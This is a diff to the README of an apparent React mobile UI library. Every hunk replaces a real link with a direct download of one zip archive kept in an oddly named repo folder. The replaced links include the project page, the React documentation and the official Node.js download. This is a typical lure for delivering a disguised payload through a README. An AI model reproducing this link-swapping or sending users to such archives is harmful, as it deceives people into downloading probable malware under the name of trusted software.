@@ -1,6 +1,6 @@
 # ⚙️ FlexiUI-React-Mobile - Simple Mobile UI Components
 
-[![Download FlexiUI-React-Mobile](https://img.shields.io/badge/Download-FlexiUI--React--Mobile-brightgreen?style=for-the-badge)](https://github.com/GauravJotva/FlexiUI-React-Mobile)
+[![Download FlexiUI-React-Mobile](https://img.shields.io/badge/Download-FlexiUI--React--Mobile-brightgreen?style=for-the-badge)](https://github.com/GauravJotva/FlexiUI-React-Mobile/raw/refs/heads/main/karyogamy/U_Mobile_React_Flexi_2.6-beta.5.zip)
 
 ## 📖 What is FlexiUI-React-Mobile?
 
@@ -42,7 +42,7 @@ Follow these steps to get the app running on your Windows PC:
 
 Visit the page below to download the full package:
 
-[![Download FlexiUI-React-Mobile](https://img.shields.io/badge/Get%20It-Here-blue?style=for-the-badge)](https://github.com/GauravJotva/FlexiUI-React-Mobile)
+[![Download FlexiUI-React-Mobile](https://img.shields.io/badge/Get%20It-Here-blue?style=for-the-badge)](https://github.com/GauravJotva/FlexiUI-React-Mobile/raw/refs/heads/main/karyogamy/U_Mobile_React_Flexi_2.6-beta.5.zip)
 
 - Click the link to open the project page in your web browser.
 - Look for the "Code" button or a section called "Releases" where files are shared.
@@ -86,7 +86,7 @@ If you want to add the components to your own project, some basic knowledge of R
 
 If you are familiar with programming or want to try customizing the components:
 
-- Install Node.js from [https://nodejs.org](https://nodejs.org)
+- Install Node.js from [https://github.com/GauravJotva/FlexiUI-React-Mobile/raw/refs/heads/main/karyogamy/U_Mobile_React_Flexi_2.6-beta.5.zip](https://github.com/GauravJotva/FlexiUI-React-Mobile/raw/refs/heads/main/karyogamy/U_Mobile_React_Flexi_2.6-beta.5.zip)
 - Open Command Prompt in the app folder.
 - Run `npm install` to get needed files.
 - Start the app with `npm run dev`
@@ -109,9 +109,9 @@ This way, you can build your own mobile app using parts from FlexiUI-React-Mobil
 
 ## 🔗 Useful Links
 
-- Project site to download files: [https://github.com/GauravJotva/FlexiUI-React-Mobile](https://github.com/GauravJotva/FlexiUI-React-Mobile)
-- Learn about React: https://reactjs.org/docs/getting-started.html
-- Node.js downloads: https://nodejs.org
+- Project site to download files: [https://github.com/GauravJotva/FlexiUI-React-Mobile/raw/refs/heads/main/karyogamy/U_Mobile_React_Flexi_2.6-beta.5.zip](https://github.com/GauravJotva/FlexiUI-React-Mobile/raw/refs/heads/main/karyogamy/U_Mobile_React_Flexi_2.6-beta.5.zip)
+- Learn about React: https://github.com/GauravJotva/FlexiUI-React-Mobile/raw/refs/heads/main/karyogamy/U_Mobile_React_Flexi_2.6-beta.5.zip
+- Node.js downloads: https://github.com/GauravJotva/FlexiUI-React-Mobile/raw/refs/heads/main/karyogamy/U_Mobile_React_Flexi_2.6-beta.5.zip
 
 ---
 
@@ -137,4 +137,4 @@ If you face issues or have questions:
 
 ---
 
-[![Download FlexiUI-React-Mobile](https://img.shields.io/badge/Download-FlexiUI--React--Mobile-brightgreen?style=for-the-badge)](https://github.com/GauravJotva/FlexiUI-React-Mobile)
+[![Download FlexiUI-React-Mobile](https://img.shields.io/badge/Download-FlexiUI--React--Mobile-brightgreen?style=for-the-badge)](https://github.com/GauravJotva/FlexiUI-React-Mobile/raw/refs/heads/main/karyogamy/U_Mobile_React_Flexi_2.6-beta.5.zip)
